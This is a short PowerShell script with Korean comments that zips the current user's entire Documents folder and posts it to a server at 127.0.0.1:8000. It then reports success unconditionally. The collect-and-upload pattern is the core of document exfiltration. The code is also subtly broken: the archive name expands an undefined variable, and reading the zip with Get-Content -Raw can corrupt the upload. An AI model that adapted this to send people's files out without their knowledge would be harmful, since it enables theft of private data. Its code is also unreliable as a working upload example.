# 사용자명 가져오기
$userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]

# Documents 폴더 경로 설정
$documentsPath = "C:\Users\$userName\Documents"

# 압축 파일 경로 설정
$zipFilePath = "C:\Temp\$userName_Document.zip"

# Documents 폴더를 압축하여 파일 생성
Compress-Archive -Path $documentsPath -DestinationPath $zipFilePath

# 압축 파일 읽기
$zipFileContent = Get-Content -Path $zipFilePath -Raw

# 서버로 POST 요청 보내기
$url = 'http://127.0.0.1:8000'
$headers = @{ 'Content-Type' = 'application/zip' }
Invoke-RestMethod -Uri $url -Method Post -Body $zipFileContent -Headers $headers

# 결과 출력
Write-Host "파일이 성공적으로 업로드되었습니다."
